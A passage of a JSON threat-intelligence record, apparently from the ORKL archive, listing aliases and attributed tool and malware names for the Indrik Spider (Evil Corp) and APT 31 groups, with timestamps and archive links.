            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dc7ee503-9494-4fb6-a678-440c68fd31d8",
            "created_at": "2022-10-25T16:07:23.349177Z",
            "updated_at": "2025-03-27T02:02:09.748159Z",
            "deleted_at": null,
            "main_name": "APT 31",
            "aliases": [
                "APT 31",
                "Bronze Vinewood",
                "Judgment Panda",
                "Red Keres",
                "RedBravo",
                "TA412",
                "Violet Typhoon",
                "Zirconium"
            ],
            "source_name": "ETDA:APT 31",
            "tools": [
                "9002 RAT",
                "Agent.dhwf",
                "AngryRebel",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "GrewApacha",
                "HOMEUNIX",
                "HiKit",
                "HidraQ",
                "Homux",
                "Hydraq",
                "Kaba",
                "Korplug",
                "McRAT",
                "MdmBot",
                "Moudour",
                "Mydoor",
                "PCRat",
                "PlugX",
                "RedDelta",
                "Roarur",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "Xamtrav"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535548,
    "ts_updated_at": 1743041804,
    "ts_creation_date": 1653766508,
    "ts_modification_date": 1653766508,
    "files": {
        "pdf": "https://archive.orkl.eu/426d64ad09acb97d491d45c4403776c405b9dd3d.pdf",
        "text": "https://archive.orkl.eu/426d64ad09acb97d491d45c4403776c405b9dd3d.txt",
        "img": "https://archive.orkl.eu/426d64ad09acb97d491d45c4403776c405b9dd3d.jpg"
    }
}